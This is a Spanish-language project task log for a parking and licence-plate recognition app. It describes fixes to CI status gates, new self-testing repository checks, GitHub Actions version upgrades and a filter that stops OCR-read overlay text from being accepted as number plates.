  - [x] Resultado medido: **130 capturas** (26 pantallas × 5 anchos), **0 desbordes**, **0 errores de consola**, **0 errores de login**; sólo los 10 avisos conocidos (2 por ancho: `/mapa` y `/vivo`, que nunca dejan la red en reposo).
  - [x] `tools/verificar_repo.py --completo` usa ahora el modo multi-anchos (una sola QA, no cinco).
  - [x] El fallo de login dice **por qué** falla.
  - [x] La autoprueba del detector de desbordes sigue en verde tras el refactor.

### T-42 · P1 — la herramienta que decide si el CI está verde tenía un falso verde

- **Estado**: **completado** — clasificación con estados separados, autoprueba de 5 casos y filtro por rama
- **Contexto**: `tools/estado_ci.py` es la herramienta que decide si el **último criterio del plan** está cumplido (los 4 checks del CI sobre `main` en SUCCESS). Si clasifica mal, el plan se cierra —o se deja abierto— por un motivo falso. Es, por tanto, la puerta más delicada del repo, y era la **única sin autoprueba**.
- **Los 2 defectos que tenía**:
  1. **Falso verde con un run en curso.** Si el run todavía no había terminado (por ejemplo, recién acabas de hacer `git push`), no hay jobs todavía: la lista de jobs salía vacía, no había ningún job en rojo, y la herramienta caía en el mensaje **"El CI de main está EN VERDE"**. Justo en el momento en que se decide si el criterio está cumplido.
  2. **No filtraba por rama.** El docstring dice "sobre `main`" y el criterio es "los checks del CI **sobre `main`**", pero la herramienta usaba el run más reciente **sea cual sea su rama**. Con una rama de trabajo con runs, informaría del CI equivocado. (Medido: hoy los 30 runs más recientes son todos de `main`, así que no está muerde — pero el día que haya una rama con runs, morderá.)
- **El arreglo**:
  - La clasificación se separa en una función pura `_clasificar(run, jobs)` → (código, líneas), que se puede probar con casos de mentira.
  - Un **estado nuevo `EN_CURSO` (código 3)**: un run que no ha terminado no es verde, y `verificar_repo.py` lo dice así ("todavía en curso, no se puede afirmar").
  - Un run completado **sin jobs** tampoco es verde.
  - **Filtro por rama** (`--rama`, por defecto `main`) en la consulta a la API, y el commit del run aparece en el informe para poder compararlo con el `HEAD` local.
- **Criterios de aceptación**:
  - [x] La autoprueba distingue los **5 casos**: 4 jobs en verde → VERDE; un job en rojo con pasos → ROJO; 4 jobs en `failure` sin pasos → RECHAZADO POR LA CUENTA; run en curso sin jobs → EN_CURSO (**no** verde); run completado sin jobs → no verde.
  - [x] Está en la meta-puerta, que pasa de 10 a **11 autopruebas**.
  - [x] Comprobado contra el CI real: el último run de `main` (4 jobs, 0 pasos) se clasifica como **rechazado por la cuenta** (código 2), que es lo que es.
  - [x] `verificar_repo.py` distingue el estado "en curso" del "en rojo".

### T-43 · P1 — la puerta del inventario comparaba el documento contra el generador, y los dos del mismo código

- **Estado**: **completado** — la cadena pasa a ser *app real → extractor → documento*
- **Contexto**: T-40 arregló el extractor (leía un solo rol). Al arreglarlo, la autoprueba del extractor se añadió como **tercera** fuente, pero quedó un hueco por delante: la puerta del inventario (`tools/verificar_api_doc.py`) comparaba el documento contra el **generador** (`generar_seccion_api.seccion()`), y el generador usa el **mismo extractor**.
- **El hueco**: si el extractor **no veía una ruta**, esa ruta tampoco estaría en el documento (se genera con el extractor) y la puerta diría "el inventario coincide con el código". Es decir: **una ruta invisible en el extractor era invisible en el documento y en la puerta**. Y la puerta del contrato sólo la habría cantado si el frontend la llamara.
- **La tercera fuente era la que ya existía y no se usaba**: `extraer_api.py` (sin `--autoprueba`) compara el extractor contra el **OpenAPI de la aplicación real** — la verdad de referencia. Pero **ninguna puerta lo ejecutaba**: era un dato que se comprobaba a mano de vez en cuando.
- **El arreglo**:
  - `verificar_api_doc.py` compara ahora **el extractor contra el OpenAPI de la app real**, antes de comparar el documento. La cadena completa es: *app real → extractor → documento*, y cada eslabón se comprueba contra el anterior.
  - La comparación se extrae a una función pura `_comparar_con_openapi(extraidas, openapi)` para que la autoprueba pueda probarla **sin** la app instalada (importa la app en el camino normal, no en la autoprueba).
  - La autoprueba del verificador pasa de **3 a 5 caras**: además de quitar ruta, añadir ruta inexistente y cambiar el RBAC, ahora comprueba que se detecta una ruta que el extractor no ve y una ruta que el extractor inventa.
  - `extraer_api._rutas_openapi()` pasa a ser público (`rutas_openapi`), porque ahora lo usa otra herramienta.
- **Criterios de aceptación**:
  - [x] La puerta dice las tres cifras: rutas del código, rutas del OpenAPI (la verdad) y rutas documentadas — **101 / 101 / 101**.
  - [x] La autoprueba detecta las **5** caras de la deriva.
  - [x] La autoprueba **no** depende de la app instalada (sigue funcionando en el job `backend`, que corre antes del `pip install`).
  - [x] El inventario sigue coincidiendo con el código.

### T-44 · P0 — el CI remoto habría salido ROJO en cuanto se arreglase la facturación

- **Estado**: **completado** — el CI puede comprobar **todas** las autopruebas, y "no comprobado" ya no se confunde con "pasa"
- **Contexto**: el job `backend` del workflow corre `tools/autopruebas.py` **antes** del `pip install` (a propósito: así las autopruebas fallan en segundos en vez de después de un install largo). De las 11 autopruebas, **10 sólo usan la biblioteca estándar**. La undécima —la del detector de desbordes de la QA visual— necesita **playwright**, porque evalúa el JavaScript en un Chromium de verdad (el JS mide anchos de elementos, y eso sólo lo sabe un motor de layout).
- **El problema**: `playwright` **no es dependencia del backend** (ni de `.[dev]`), y el `import` de `qa_visual.py` estaba en la cabecera del módulo. En un runner limpio, el paso "Las puertas se prueban a sí mismas" moría con `ModuleNotFoundError: No module named 'playwright'` → **la meta-puerta fallaba** → **el job `backend` salía rojo**.
  - **La réplica local no lo detectaba**: el host ya tenía playwright instalado, y la réplica ejecuta los pasos del YAML en esta máquina, no en un runner limpio. Es decir: **la réplica local daba un verde que el CI real no daría**. Justo el tipo de puerta que este repo lleva toda la sesión desmontando.
  - **Probado, no supuesto**: se creó un venv vacío (`python -m venv`, sin playwright) y se ejecutó la meta-puerta dentro: `ModuleNotFoundError` y salida 1. El fallo es real, no una hipótesis.
- **El arreglo (3 cosas)**:
  1. **`qa_visual.py` se importa sin playwright**: el `import` pasa a ser opcional y, si falta, la autoprueba devuelve un código nuevo, **3 = "no se ha podido comprobar"**, con el mensaje de cómo instalarlo. Nada de reventar con un `ModuleNotFoundError` disfrazado de problema de código.
  2. **La meta-puerta distingue los tres estados**: `0` pasa, `1` falla, **`3` no se ha podido comprobar**. Con la opción **`--estricto`** (la que usa el CI y `verificar_repo.py`), lo no comprobado **es un fallo**; sin ella, se avisa con claridad y **no** se dice "las autopruebas pasan". El resumen distingue "10 pasan y 1 no se ha podido comprobar" de "las 11 pasan".
  3. **El CI instala el navegador antes de las autopruebas**: un paso nuevo en el job `backend` (`pip install playwright` + `playwright install chromium`, con `--with-deps` sólo en Linux, que es donde hace falta instalar las librerías del sistema). Así, en el CI, **las 11 autopruebas se comprueban de verdad**.
- **Por qué esto era P0**: el último criterio del plan pide que los 4 checks del CI sobre `main` terminen en SUCCESS. Con el CI roto por este `ModuleNotFoundError`, arreglar la facturación no habría servido de nada: el job `backend` habría seguido en rojo, y el criterio seguía sin poder marcarse. La causa no era la cuenta: era del repo.
- **Criterios de aceptación**:
  - [x] En un entorno limpio (venv sin playwright), la autoprueba de la QA **no revienta**: dice "NO VERIFICADO" y sale con código 3.
  - [x] La meta-puerta en ese entorno: "10 autopruebas pasan y 1 NO se han podido comprobar", y con `--estricto` sale con código 1.
  - [x] En el host (con playwright): "Las 11 autopruebas pasan", código 0, también con `--estricto`.
  - [x] El workflow instala el navegador antes de las autopruebas, y las autopruebas del CI van con `--estricto`.
  - [x] `actionlint` exit 0 y el job `backend` replicado en local con el paso nuevo.

### T-45 · P0 — las acciones del workflow iban 3 versiones por detrás y dependían de un workaround ya sin validar

- **Estado**: **completado** — las tres acciones pasan a la versión que corre en node24, y el workaround de Node "inseguro" desaparece
- **Contexto**: T-44 destapó que la réplica local del CI no reproduce un runner limpio. Aplicando esa misma mirada al **workflow en sí**, salió otra cosa: el workflow fijaba `actions/checkout@v4`, `actions/setup-python@v5` y `actions/setup-node@v4` — **tres versiones mayores por detrás** de las actuales — y su propio comentario explicaba por qué:
  > *"GH Actions deprecó Node 20 en 2025-09-19 y fuerza Node 24. Las acciones @v4/@v5 targetean Node 20 → conflicto en cache de dependencias. Esta env var autoriza a las acciones deprecadas a seguir corriendo en su versión original."*
- **El problema, medido contra la API de GitHub** (el runtime de Node de cada versión, leído del `action.yml` de cada etiqueta):

  | Acción | Fijada | Runtime | Primera versión con node24 |
  |---|---|---|---|
  | `actions/checkout` | v4 | **node20** | v5 |
  | `actions/setup-python` | v5 | **node20** | v6 |
  | `actions/setup-node` | v4 | **node20** | v5 |

  Las tres estaban en **node20, un runtime que la plataforma ya ha desuscrito** y fuerza a node24, y dependían de `ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION` — una variable cuyo nombre dice, literalmente, que autoriza a ejecutar versiones de Node **inseguras**, y que la plataforma puede retirar cuando quiera. Como el CI **no ha arrancado un job desde el 2026-07-07**, esas versiones estaban **completamente sin validar contra la plataforma de hoy**: el workflow podía fallar en el **primer paso** (el checkout), antes de ejecutar nada del proyecto.
- **El arreglo**: el **salto mínimo** al runtime soportado, no el más grande. `checkout@v5`, `setup-python@v6`, `setup-node@v5` — una versión mayor, no tres. Los cambios incompatibles de esas versiones se revisaron uno a uno en sus notas de versión:
  - `setup-python@v6`: sólo "upgrade a node 24" (requiere runner ≥ v2.327.1, y los runners hospedados de GitHub lo son). Ninguna entrada cambia.
  - `setup-node@v5`: "upgrade a node 24" y **auto-cache de npm** si el `package.json` trae un campo `packageManager`. Este proyecto no lo tiene, pero se desactiva explícitamente con `package-manager-cache: false` (que es justo la forma que documenta la acción), en lugar del `cache: ""` de antes.
  - `checkout@v5`: node 24, sin cambios que afecten a este workflow (no usa entradas).
  - Y se **elimina** `ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION` de los tres jobs: ya no hay nada que autorizar.
- **Lo que se verificó al mismo tiempo** (porque es la otra mitad del mismo audit):
  - **Job `frontend` en su entorno real**: un contenedor `node:20` con `npm ci` **desde cero** (Node 20 = el del CI, host = Node 24) → `npm ci`, `npm run lint`, `npx vue-tsc --noEmit` y `npm run build`: **todo en verde**, 36 assets en el precache del service worker.
  - **Job `backend` en su entorno real**: un contenedor `python:3.11-slim` limpio con `pip install -e ".[dev]"` **desde cero** → **565 passed, 10 skipped**.
  - **Fin de línea**: todos los ficheros ejecutables (`.sh` y el hook) están guardados con **LF** en el repo, así que en Linux no hay `/bin/bash^M: bad interpreter`. El `.gitattributes` ya lo fuerza para `*.sh`.
  - **`package-lock.json`**: **sí existe y sí está versionado** (el comentario del workflow decía lo contrario). Se corrige el comentario: `npm ci` es lo correcto.
- **Criterios de aceptación**:
  - [x] Las tres acciones del workflow corren en **node24** (comprobado leyendo el `action.yml` de cada etiqueta).
  - [x] Se elimina `ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION` de los tres jobs.
  - [x] `setup-node` desactiva el auto-cache de npm de la v5 de forma explícita.
  - [x] Los cambios incompatibles de las tres versiones revisados en sus notas de versión: ninguno afecta a este workflow.
  - [x] `actionlint` exit 0 con el workflow actualizado.
  - [x] El job `frontend` pasa entero en `node:20` con instalación limpia, y el job `backend` en `python:3.11-slim` con instalación limpia.
  - [x] El job `integration` pasa entero en su entorno real: un `postgis/postgis:16-3.4` **recién creado** (como el service container del CI) y un `python:3.11-slim` limpio → **574 passed, 1 skipped** contra PostgreSQL, el test de funciones sólo-de-SQLite **13 passed**, y los 5 pasos de herramientas (inventario, contrato, roles, migraciones y despliegue limpio) **en verde**.

### T-46 · P1 — la puerta del CI daba por bueno un run al que le faltara un job

- **Estado**: **completado** — estado nuevo `INCOMPLETO` (código 4) y comprobación contra el workflow local
- **Contexto**: el último criterio del plan dice, literalmente, "los **4 checks** del CI sobre `main` en SUCCESS (Backend, Integration, Build de imágenes Docker y Frontend)". Pero `tools/estado_ci.py` miraba **los jobs que tuviera el run**: si alguien quitaba un job del workflow (o el run era de un commit anterior del workflow), la herramienta decía **"EN VERDE"** con los que quedaran. Un verde que no cumple el criterio.
- **El arreglo**:
  - La herramienta lee **los jobs que define el workflow de este repo** (`.github/workflows/ci.yml`) y los compara con los del run. Si falta alguno, no es verde: nuevo estado **INCOMPLETO (código 4)**, con el mensaje de qué job falta.
  - Se parsea el workflow con una **expresión regular**, no con PyYAML: PyYAML llega sólo como dependencia transitiva de `uvicorn[standard]`, y este repo ya ha sufrido bastante con depender de cosas que nadie declaró (T-44).
- **Criterios de aceptación**:
  - [x] La autoprueba distingue los 8 casos: verde, job que falta (**no** verde), todos los esperados, rojo con pasos, rechazado por la cuenta, en curso, sin jobs, y que el workflow real define 4 jobs.
  - [x] Comprobado contra el CI real: el último run de `main` sigue clasificándose como **rechazado por la cuenta** (código 2), que es lo que es.
  - [x] `verificar_repo.py` distingue el estado "incompleto" del "en rojo".

### T-47 · P1 — las credenciales de las cuentas demo estaban escritas en tres sitios sin que nada las comparara

- **Estado**: **completado** — puerta nueva con autoprueba y paso en el CI
- **Contexto**: las credenciales de las cuentas demo están escritas **tres veces**:
  1. `backend/app/scripts/seed.py` → `DEMO_USERS`: lo que hay de verdad en la base de datos.
  2. `frontend/src/views/LoginView.vue` → el mapa de `fillDemo()`: lo que el usuario ve en la pantalla de login y con lo que rellena el formulario al pulsar "Admin", "Gestor", "Operador" o "Cliente".
  3. `frontend/scripts/qa_visual.py` → `CUENTAS`: con lo que la QA visual inicia sesión.
- **El problema**: **nada las comparaba**, y el modo de fallo es de las peores. Si el seed cambia una contraseña, la pantalla de login sigue rellenando la vieja y **el usuario del demo no puede entrar**, con un "email o contraseña incorrectos" que no dice absolutamente nada; y la QA falla con un error de navegación que culpa al navegador. Nadie pensaría en mirar el seed.
  - Y la puerta de "despliegue limpio" (que sí existe) comprueba que el seed cree **4 usuarios**, pero **no** que sus contraseñas sean las que la pantalla de login ofrece.
- **La puerta** (`tools/verificar_cuentas_demo.py`) lee las tres listas (el seed y la QA con `ast`; el mapa del login con una expresión regular acotada, porque es TypeScript dentro de un `.vue`) y comprueba:
  - cada cuenta que ofrece el login **existe en el seed con la misma contraseña** y con **ese rol**;
  - lo mismo para las cuentas que usa la QA visual;
  - los roles del seed existen en el enum `UserRole` (leído del código);
  - el login ofrece **todas** las cuentas del seed (es un entorno de demostración: si hay una cuenta, tiene que ser alcanzable desde la pantalla).
- **Criterios de aceptación**:
  - [x] La puerta compara los tres sitios y dice exactamente dónde se descuadran (qué lado dice qué).
  - [x] **Probado con el defecto reintroducido**: cambiando la contraseña del admin en el seed, la puerta canta las **2** discrepancias (la del login y la de la QA) y sale con código 1. Al restoring, vuelve a verde.
  - [x] Es estática (no necesita base de datos ni dependencias) → puede ir en el CI.
  - [x] Está en la meta-puerta, que pasa de 11 a **12 autopruebas**, y en `tools/verificar_repo.py` (14 comprobaciones).
  - [x] Paso nuevo en el job `integration` del CI, y `actionlint` exit 0.

### T-48 · P1 — la QA visual no cubría 6 pantallas del router y nada lo decía

- **Estado**: **completado** — las 6 pantallas añadidas, puerta nueva de cobertura con autoprueba y paso en el CI
- **Contexto**: la QA visual recorre una lista de pantallas escrita a mano (`PANTALLAS` en `frontend/scripts/qa_visual.py`) que es una **copia** de las rutas del router. **Nada las comparaba.** El resultado: **seis rutas del router no se revisaban nunca**:
  | Ruta | Pantalla |
  |---|---|
  | `/dashboard` | el dashboard de admin |
  | `/admin/parkings` | la lista de parkings |
  | `/admin/costs` | la lista de costes |
  | `/forbidden` | la pantalla de acceso denegado |
  | `/:pathMatch(.*)*` | la pantalla de "no encontrada" |

  La puerta de "despliegue limpio" comprueba que el seed cree 5 parkings, y la de cobertura de endpoints que todos los endpoints tengan test: ninguna de las dos mira **qué pantallas se revisan visualmente**. Y la propia auditoría móvil (T-13) encontró 26 desbordes en 6 pantallas **de las que sí se revisaban** — las 3 pantallas de admin **nunca se habían mirado a 414 px**.
- **El arreglo (2 cosas)**:
  1. **Las 5 pantallas se añaden a la QA** (la de "no encontrada" se visita con una ruta que no existe, a propósito). La QA pasa de 21 a **26 pantallas**.
  2. **Puerta nueva** (`tools/verificar_cobertura_frontend.py`): comprueba que **toda** ruta del router se recorre, avisa de las que no, avisa de las que la QA recorre y no existen (la visita al 404 es la única admitida), y avisa si la pantalla de "no encontrada" no se comprueba nunca. Las rutas que no se puedan recorrer van en una lista de **exenciones con su motivo** (hoy hay dos: `/`, que es una redirección por rol, y `/calibrate/:parkingId/:cameraId`, que necesita ids reales de parking y cámara).
  - A propósito, esta puerta **no** reutiliza el extractor de rutas de `verificar_roles_frontend.py`: dos extractores independientes que se vigilan mutuamente valen más que uno compartido (si los dos usan el mismo código, los dos pueden quedarse ciegos a la vez).
- **Criterios de aceptación**:
  - [x] La puerta detecta una ruta del router sin cubrir, una pantalla huerfana, más de una visita fuera del router (posible errata) y la pantalla de "no encontrada" sin comprobar. **7 casos** de autoprueba.
  - [x] **Probado con el defecto reintroducido**: añadiendo una ruta de prueba al router, la puerta la canta y sale con código 1; al quitarla, vuelve a verde.
  - [x] Las 5 pantallas añadidas se comprueban de verdad: las **26 pantallas** en los **5 anchos**, con 0 desbordes, 0 errores de consola y 0 errores de red.
  - [x] Está en la meta-puerta (que pasa de 12 a **13 autopruebas**), en `tools/verificar_repo.py` (15 comprobaciones) y en el CI.
  - [x] `actionlint` exit 0 y `ruff` limpio.

### T-49 · P1 — el frontend replica a mano los enums del backend y nada lo comparaba

- **Estado**: **completado** — puerta nueva con autoprueba, paso en el CI, y el `statusBadge` que mentía corregido
- **Contexto**: el frontend replica las enumeraciones del backend **a mano, en muchos sitios**:
  - `layouts/AppLayout.vue` y `views/cliente/ProfileView.vue` → el mapa de etiquetas de cada rol (**dos copias** del mismo mapa).
  - `views/admin/UsersView.vue` → la lista de roles que el admin puede asignar.
  - `api/client.ts` y `api/gestorOps.ts` → el tipo `role` (**dos copias**).
  - `views/cliente/TicketsView.vue` → el tipo `TicketStatus`.
  - `views/gestor/MovementsView.vue` y `views/cliente/TicketsView.vue` → la función `statusBadge()`.
  - `views/gestor/AlertsView.vue` → el mapa de tipos de alerta.
  - `views/gestor/CamerasView.vue` → el tipo de cámara y el sentido de la geocerca.
- **El problema**: **nada lo comparaba**. Hoy los dos lados coinciden, pero si el backend añade un rol, un tipo de alerta o un estado de ticket:
  - el mapa de etiquetas devuelve `undefined` y la pantalla muestra un **hueco**;
  - el desplegable de "asignar rol" del admin **no ofrece el rol nuevo**, así que ese rol no se puede asignar desde la interfaz;
  - y, lo peor, `statusBadge()` **etiquetaba cualquier estado desconocido como "Anulado"**: es decir, la pantalla afirmaba que un ticket estaba anulado cuando no lo estaba.
- **El arreglo (2 cosas)**:
  1. **Puerta nueva** (`tools/verificar_enums_frontend.py`): si el frontend conoce algún valor de un enum del backend, tiene que conocer **todos**. El mensaje dice **en qué ficheros** se usa ese enum, para que se sepa dónde tocar. Con 11 enums en el backend y 11 usados por el frontend, hoy sale en verde.
  2. **`statusBadge` deja de mentir**: los tres estados del backend se tratan explícitamente y **cualquier otro se muestra tal cual**, con etiqueta neutra. La UI ya no afirma nada falso sobre el estado de un ticket; y la puerta avisa si el backend añade un estado que el frontend no conoce.
- **Criterios de aceptación**:
  - [x] La puerta detecta un valor de enum que el frontend no conoce, dice en qué ficheros se usa el enum, no se queja de enums que el frontend no usa, y **no** se queja cuando el frontend conoce todos los valores. 4 casos de autoprueba.
  - [x] **Probado con el defecto reintroducido**: añadiendo `SUSPENDIDO` a `TicketStatus` en el backend, la puerta canta `TicketStatus.suspendido` y dice que se usa en `MapView.vue`, `MovementsView.vue` y `TicketsView.vue`; al quitarlo, vuelve a verde.
  - [x] `statusBadge` (en las dos vistas) ya no devuelve "Anulado" para un estado desconocido.
  - [x] `vue-tsc --noEmit` y `npm run lint` en verde, y la QA visual sigue en verde.
  - [x] Está en la meta-puerta (que pasa de 13 a **14 autopruebas**), en `tools/verificar_repo.py` (16 comprobaciones) y en el CI.

### T-50 · P0 — la lectura automática de matrículas NO estaba conectada a nada

- **Estado**: **completado** — el hueco queda documentado, los comentarios que lo ocultaban corregidos, y hay una puerta que lo vigila
- **Contexto**: `solidapp.ping_camera` es la tarea que agarra el frame de la cámara, se lo manda al servicio OCR y **crea el ticket**. Es el corazón del producto.
- **Lo que se encontró (medido, no supuesto)**:
  - La tarea **existe** y está **registrada** en el worker (`celery inspect registered` la lista).
  - **No está** en el `beat_schedule` de `app/workers/celery_app.py`.
  - **Nadie la despacha**: en todo el backend no hay ni un `.delay()`, ni un `.apply_async()`, ni un `send_task()`. El único que consume el servicio OCR es esa misma tarea.
  - El commit que la creó (66c172f, 2026-06-30) lo dijo explícitamente: *"solidapp.ping_camera (bajo demanda): stub de health-check de una cámara concreta... **Diseñado para que el endpoint `/admin/cameras/{id}/ping` lo enqueue cuando se añada**"*. Ese endpoint **nunca se añadió**.
  - Al día siguiente (0e9057f) se escribió el comentario que la daba por viva: *"``ping_camera`` sigue corriendo en paralelo con ``kind='frame'``; ambos comparten el lock de 1 h de CAMERA_OFFLINE"*. Y en `celery_app.py`: *"Comparte lock de 1 h con el detector de ``frame`` para no duplicar"*. **Los dos comentarios describían un comportamiento que no existía.**
  - **La prueba en la base de datos**: las 8 filas de `plates_detected` son del **2026-06-30** y son datos de prueba empujados a mano (`1234ABC`, `9999XYZ`); la última matrícula que el sistema leyó en su vida es de hace **más de tres meses y medio**. En cambio hay **98 alertas de cámara caída**, todas del detector de *heartbeat* (`probe_heartbeats`), que sí se despacha cada 60 s.
  - Es decir: **la detección de cámaras caídas funciona; la lectura de matrículas no**. El pipeline que hoy funciona es el **push externo** al endpoint `POST /parkings/{id}/plates-detected` (el que usa el `rtsp-push` de QA), no la tarea de Celery.
- **El arreglo (3 cosas)**:
  1. **Los comentarios que mentían, corregidos**: `tasks.py` y `celery_app.py` dicen ahora exactamente qué corre y qué no, y por qué. Un comentario que describe un comportamiento inexistente es peor que no tener comentario: hace que el próximo que lo lea dé por hecho que el pipeline funciona.
  2. **Puerta nueva** (`tools/verificar_tareas_celery.py`): comprueba que **toda tarea de Celery se ejecuta de verdad** (está en el beat, o alguien la despacha, o alguien la llama directamente). Recorre el AST, no un grep: por eso ve el comentario que mentía y lo ve como lo que es (un comentario). Las tareas que no se ejecutan **a propósito** van en una lista de exenciones con su motivo; las demás son un **fallo del CI**.
  3. **El hallazgo queda escrito** en el código, en el plan y en el codemap, con su medida (la fecha de la última matrícula leída).
- **Criterios de aceptación**:
  - [x] La puerta detecta una tarea nueva sin horario ni despacho (**probado**: con una tarea de prueba inyectada, la puerta la canta y sale con código 1) y **no** se queja de una que sí se despacha ni de la que se llama directamente.
  - [x] La puerta recorre el AST, así que las menciones en docstrings y comentarios **no** cuentan como ejecución (justo donde estaba la mentira).
  - [x] Los comentarios de `tasks.py` y `celery_app.py` dicen la verdad sobre qué detector corre.
  - [x] Está en la meta-puerta (que pasa de 14 a **15 autopruebas**), en `tools/verificar_repo.py` (17 comprobaciones) y en el CI.
  - [x] `actionlint` exit 0 y `ruff` limpio.
- **Decisión que queda para el usuario (no es un olvido)**: **despachar o no `ping_camera`**. Conectarla implica decisiones de producto que este repo no puede tomar solo:
  - **Cómo**: `ping_camera` es *por cámara* (`ping_camera(camera_id)`), así que el beat tendría que despacharla una por cámara (una tarea batch que itere y encole, como hace `probe_heartbeats` con su sonda). Eso implica decidir cada cuánto y con qué concurrencia.
  - **Qué pasa con las cámaras de demo**: las del seed apuntan a `rtsp://demo.invalid` a propósito; `probe_heartbeats` las skipea (`heartbeat_skip_url_prefixes`), pero `ping_camera` **no**: abriría un RTSP inexistente por cámara y por minuto.
  - **Qué pasa con la carga**: decodificar un JPEG completo por cámara y por minuto es mucho más caro que el `grab()` sin decodificar del heartbeat, y el servicio OCR (PaddleOCR) es el piece más pesado del stack.
  - **Qué pasa con la detección de caídas**: con los dos detectores vivos habría que confiar en el lock de 1 h para no duplicar alertas (eso ya está implementado y testeado, pero nunca se ha ejercido en producción).

### T-51 · P1 — siete ajustes del backend que nadie leía (y dos que engañaban)

- **Estado**: **completado** — los siete documentados con su motivo, y puerta nueva que vigila que no crezca la lista
- **Contexto**: un ajuste **muerto** (declarado, configurable por entorno y que **nadie lee**) es una trampa silenciosa: parece configurable y no hace nada. El que más daño hace es el que parece importante.
- **Los siete, con su motivo real**:
  | Ajuste | Por qué está muerto | Dónde vive de verdad |
  |---|---|---|
  | `ocr_confidence_threshold` (0.85) | parecía un filtro global de confianza | el filtro real es el `confidence_threshold` de **cada geocerca** (lo calibra el operador) |
  | `ocr_lang` ("es") | parecía decidir el idioma del OCR | lo decide el **servicio** OCR (`docker/ocr`, `OCR_LANG=en` para matrículas EU) |
  | `ocr_engine` | parecía elegir el motor | lo elige el servicio OCR (`OCR_ENGINE`) |
  | `async_database_url` | la app es **síncrona**: no hay `create_async_engine` en ninguna parte | — |
  | `api_host` / `api_port` | el `CMD` del Dockerfile fija `--host 0.0.0.0 --port 8000` en duro | — |
  | `loki_url` | la app no habla con Loki | los logs salen por stdout y los reenvía Promtail (`infra/promtail/promtail-config.yaml`) |
- **Los dos engañados**: `ocr_confidence_threshold` y `ocr_lang`. Con `ocr_lang` hay además una contradicción: el backend dice "es" y el servicio va con "en", y **el valor del backend no hace nada**. Un operador que lo cambiara creyendo que el OCR lee en español no lo estaría haciendo.
- **El arreglo (2 cosas)**:
  1. **Cada ajuste muerto lleva ahora un comentario que dice que no se usa y por qué**, con el puntero a dónde vive lo que sí manda. Nada de "parece configurable": o funciona, o dice que no.
  2. **Puerta nueva** (`tools/verificar_ajustes_muertos.py`): recorre los 47 ajustes declarados en `Settings` y cuenta cuántas veces se leen (por acceso al atributo, en todo el backend, tests incluidos). Los que no se leen salen listados; los conocidos están en una lista con su motivo y **cualquier otro es un fallo del CI**.
- **Criterios de aceptación**:
  - [x] La puerta detecta un ajuste muerto nuevo (**probado**: con un ajuste de prueba inyectado, la puerta lo canta y sale con código 1) y no se queja de los que se leen.
  - [x] Los 47 ajustes del backend están inventariados: 40 se leen, 7 no, y los 7 tienen su motivo documentado.
  - [x] El comentario de cada ajuste muerto dice **dónde vive de verdad** lo que el operador quiere cambiar.
  - [x] La suite sigue en verde tras el cambio de `config.py` (565 passed, 10 skipped en el contenedor).
  - [x] Está en la meta-puerta (que pasa de 15 a **16 autopruebas**), en `tools/verificar_repo.py` (18 comprobaciones) y en el CI.

### T-52 · P0 — el OCR aceptaba cualquier texto como matrícula (vehículos fantasma)

- **Estado**: **completado** — filtro de formato en el punto único de ingesta, con 20 tests
- **Contexto**: T-50 dejó al descubierto que `ping_camera` no se despacha. Al ejecutarla **a mano, una vez, como diagnóstico**, se vio que la cadena sí funciona (frame → OCR → ingesta) y que el OCR **lee texto, no matrículas**.
- **La medida (con la cámara real del entorno, `CAM-01` → el stream RTSP del `rtsp-push`)**:
  - El vídeo de QA lleva **dos rótulos quemados en la imagen**: `SOLIDAPP QA — CAM 01` (arriba) y el timestamp `t=105.0s frame=2625` (abajo, en verde).
  - El OCR devolvió `"t=105.0sframe=2625"` como si fuera una matrícula, y en la siguiente pasada `"SOLIDAPPQACAM01"`.
  - El primero se descartó **sólo por medir 19 caracteres** (el `max_length=16` del esquema), por casualidad. El segundo (15 caracteres) **pasaba**.
- **Por qué es grave**: `vehicles.plate` es `String(16) unique`. Una basura corta aceptada crea un **vehículo fantasma permanente**, y si la geocerca estuviera pintada encima, un **ticket** a un vehículo que no existe. Y esto no es hipotético: **casi todas las cámaras reales queman el timestamp en la imagen**, y a veces la marca.
- **El arreglo**:
  1. **Nuevo módulo** `app/services/plates.py` con la regla `parece_matricula()`: normaliza (mayúsculas, sin separadores) y exige la forma de una matrícula — `1234ABC` (español actual), `1234B` (antiguo), `E1234A` (diplomática). La regla es **permisiva a propósito**: no se quiere rechazar una matrícula legítima, sólo el texto que no la es.
  2. **El filtro va en `process_plate_hit`**, que es el **punto único** por el que pasa una lectura para convertirse en vehículo y ticket (lo usan tanto la tarea de Celery como el push HTTP `POST /parkings/{id}/plates-detected`). Un hit que no es matrícula devuelve el estado nuevo `skipped_not_a_plate` y **no toca la base**.
  3. **También en `ping_camera`**, antes de persistir la fila de auditoría: `plates_detected.plate` es de 16 caracteres, así que un texto más largo **reventaba el INSERT** ("value too long"), y uno más corto creaba el vehículo fantasma.
  4. **Los contadores ya no mienten**: `plates_found` cuenta las matrículas válidas y hay un `plates_descartadas` para el texto quemado.
- **Lo que se verificó**:
  - Con la cámara real: el OCR leyó los dos rótulos, los dos se descartaron, `plates_found: 0`, `plates_descartadas: 1`, **0 vehículos y 0 tickets creados**.
  - **Por la API real** (`POST /api/v1/parkings/11/cameras/81/plates`, el otro camino de ingesta): antes del arreglo, una lectura basura llega hasta crear el vehículo; después, `"CAM 01"` → `skipped_not_a_plate` **sin vehículo ni ticket**, y `"1234ABC"` sigue su curso normal. (La demostración salió sin que hizo falta: con el proceso viejo todavía en memoria, la petición basura **creó un vehículo** `CAM 01` — que se deshizo por rollback porque la plaza estaba ocupada. Con plaza libre se habría quedado **para siempre**.)
  - **20 tests nuevos** (`backend/tests/test_plates_ocr.py`): la regla acepta las matrículas legítimas (incluida la diplomática y la antigua, con y sin separadores) y rechaza las formas de texto quemado; un hit basura **no crea vehículo ni ticket**; y una matrícula de verdad **sí** crea el vehículo.
  - `ruff` y `mypy app` en verde (108 ficheros).
- **Lo que queda fuera (y está documentado, no escondido)**: un rótulo como `HD 1080P` tiene **exactamente la misma forma** que una matrícula antigua (`M 1234 A`) o diplomática (`E 1234 A`), así que **ningún formato las distingue**. En la práctica ese caso lo filtra el cruce con la geocerca (el rótulo está en una esquina, fuera del rectángulo pintado) y el umbral de confianza.
- **Criterios de aceptación**:
  - [x] El filtro está en el punto único de ingesta (`process_plate_hit`) y también en la tarea de Celery, antes de persistir.
  - [x] Un hit que no es matrícula no crea vehículo ni ticket (test con la BD real de la suite).
  - [x] Una matrícula legítima sigue funcionando (test).
